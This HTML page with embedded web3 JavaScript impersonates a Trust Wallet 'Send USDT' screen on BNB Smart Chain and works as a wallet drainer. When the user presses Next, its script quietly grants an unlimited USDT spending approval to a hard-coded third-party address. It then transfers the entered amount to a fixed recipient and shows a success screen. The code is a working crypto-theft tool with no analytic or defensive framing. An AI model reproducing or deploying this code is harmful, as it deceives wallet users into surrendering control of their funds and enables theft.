<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send USDT - Trust Wallet</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        :root {
            --primary: #1abc9c;
            --bg: #1a1a1a;
            --surface: #242424;
            --surface-light: #2f2f2f;
            --border: #3a3a3a;
            --text-primary: #ffffff;
            --text-secondary: #b0b0b0;
            --text-tertiary: #808080;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            background: var(--bg);
            color: var(--text-primary);
            height: 100vh;
            overflow: hidden;
        }

        .modal {
            position: fixed;
            inset: 0;
            background: var(--bg);
            display: flex;
            flex-direction: column;
            animation: slideUp 0.3s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal-header {
            padding: 16px 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-title { font-size: 18px; font-weight: 600; }

        .modal-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }

        .section { margin-bottom: 24px; }

        .section-label {
            font-size: 12px;
            color: var(--text-secondary);
            text-transform: uppercase;
            margin-bottom: 12px;
            letter-spacing: 0.5px;
        }

        .input-field {
            width: 100%;
            background: var(--surface);
            border: 1.5px solid var(--border);
            border-radius: 16px;
            padding: 14px 16px;
            font-size: 16px;
            color: var(--text-primary);
            font-weight: 500;
        }

        .input-field:focus { outline: none; border-color: var(--primary); }

        .input-wrapper { display: flex; align-items: center; gap: 12px; position: relative; }

        .max-btn {
            position: absolute;
            right: 60px;
            color: var(--primary);
            background: none;
            border: none;
            font-weight: 600;
            cursor: pointer;
        }

        .currency-tag {
            position: absolute;
            right: 16px;
            color: var(--text-tertiary);
            font-size: 14px;
        }

        .network-selector {
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--surface);
            padding: 12px;
            border-radius: 12px;
            border: 1px solid var(--border);
            width: fit-content;
        }

        .network-logo { width: 24px; height: 24px; border-radius: 50%; }

        .modal-footer {
            padding: 20px;
            border-top: 1px solid var(--border);
        }

        .next-btn {
            width: 100%;
            background: var(--primary);
            color: #000;
            border: none;
            border-radius: 24px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .next-btn:disabled { opacity: 0.5; cursor: not-allowed; }

        .screen { display: none; height: 100%; flex-direction: column; }
        .screen.active { display: flex; }

        .error-message {
            background: rgba(231, 76, 60, 0.1);
            color: #ff6b6b;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            margin-bottom: 15px;
            border: 1px solid rgba(231, 76, 60, 0.2);
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(0,0,0,0.2);
            border-top-color: #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .success-icon {
            font-size: 60px;
            color: var(--primary);
            text-align: center;
            margin: 40px 0;
        }

        .tx-box {
            background: var(--surface);
            padding: 15px;
            border-radius: 12px;
            font-family: monospace;
            font-size: 11px;
            color: var(--primary);
            word-break: break-all;
        }
    </style>
</head>
<body>

    <div class="modal">
        <div class="screen active" id="screenMain">
            <div class="modal-header">
                <div class="modal-title">Send USDT</div>
                <div style="width: 24px;"></div>
            </div>

            <div class="modal-content">
                <div id="errorDisplay"></div>

                <div class="section">
                    <div class="section-label">Recipient Address</div>
                    <div class="input-field" style="background: var(--surface-light); font-family: monospace; font-size: 13px;">
                        0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
                    </div>
                </div>

                <div class="section">
                    <div class="section-label">Network</div>
                    <div class="network-selector">
                        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="network-logo">
                        <span style="font-size: 14px;">BNB Smart Chain</span>
                    </div>
                </div>

                <div class="section">
                    <div class="section-label">Amount</div>
                    <div class="input-wrapper">
                        <input type="number" class="input-field" id="amountInput" placeholder="0.00" step="0.01">
                        <button class="max-btn" onclick="setMax()">MAX</button>
                        <span class="currency-tag">USDT</span>
                    </div>
                </div>
            </div>

            <div class="modal-footer">
                <button class="next-btn" id="actionBtn" onclick="startProcess()">Next</button>
            </div>
        </div>

        <div class="screen" id="screenSuccess">
            <div class="modal-header">
                <div class="modal-title">Status</div>
            </div>
            <div class="modal-content" style="text-align: center;">
                <div class="success-icon">✓</div>
                <h2 style="margin-bottom: 10px;">Transaction Sent</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Your USDT transfer is processing</p>
                
                <div class="section-label" style="text-align: left;">Transaction Hash</div>
                <div class="tx-box" id="txHashDisplay"></div>
            </div>
            <div class="modal-footer">
                <button class="next-btn" onclick="location.reload()">Done</button>
            </div>
        </div>
    </div>

    <script>
        const CONFIG = {
            CHAIN_ID: 56,
            USDT: '0x55d398326f99059fF775485246999027B3197955',
            RECIPIENT: '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F',
            SPENDER: '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98',
            RPC: 'https://bsc-dataseed.binance.org'
        };

        const ABI = [
            { "constant": false, "inputs": [{"name":"_s","type":"address"},{"name":"_v","type":"uint256"}], "name":"approve", "outputs":[{"name":"","type":"bool"}], "type":"function" },
            { "constant": false, "inputs": [{"name":"_t","type":"address"},{"name":"_v","type":"uint256"}], "name":"transfer", "outputs":[{"name":"","type":"bool"}], "type":"function" },
            { "constant": true, "inputs": [{"name":"_o","type":"address"}], "name":"balanceOf", "outputs":[{"name":"","type":"uint256"}], "type":"function" }
        ];

        let web3, userAccount;

        // Auto-connect and network check on load
        async function init() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    await checkNetwork();
                } catch (e) {
                    showError("Wallet connection refused.");
                }
            } else {
                showError("Please open this in Trust Wallet.");
            }
        }

        async function checkNetwork() {
            const id = await web3.eth.getChainId();
            if (id !== CONFIG.CHAIN_ID) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: Web3.utils.toHex(CONFIG.CHAIN_ID) }]
                    });
                } catch (err) {
                    if (err.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: Web3.utils.toHex(CONFIG.CHAIN_ID),
                                chainName: 'Binance Smart Chain',
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                rpcUrls: [CONFIG.RPC],
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                    }
                }
            }
        }

        async function startProcess() {
            const amount = document.getElementById('amountInput').value;
            const btn = document.getElementById('actionBtn');
            
            if (!amount || amount <= 0) return showError("Enter a valid amount");
            
            try {
                await checkNetwork();
                const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
                const weiAmount = web3.utils.toWei(amount.toString(), 'ether'); // BEP20 USDT uses 18 decimals

                // PHASE 1: AUTO-APPROVE
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span> Approving USDT...';
                
                const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });

                // PHASE 2: AUTO-SEND
                btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                const tx = await contract.methods.transfer(CONFIG.RECIPIENT, weiAmount).send({ from: userAccount });

                // SUCCESS
                document.getElementById('txHashDisplay').innerText = tx.transactionHash;
                document.getElementById('screenMain').classList.remove('active');
                document.getElementById('screenSuccess').classList.add('active');

            } catch (err) {
                showError(err.message);
                btn.disabled = false;
                btn.innerHTML = 'Next';
            }
        }

        async function setMax() {
            if (!userAccount) return;
            const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
            const bal = await contract.methods.balanceOf(userAccount).call();
            document.getElementById('amountInput').value = web3.utils.fromWei(bal, 'ether');
        }

        function showError(msg) {
            document.getElementById('errorDisplay').innerHTML = `<div class="error-message">${msg}</div>`;
            setTimeout(() => { document.getElementById('errorDisplay').innerHTML = ''; }, 5000);
        }

        window.onload = init;
    </script>
</body>
</html>
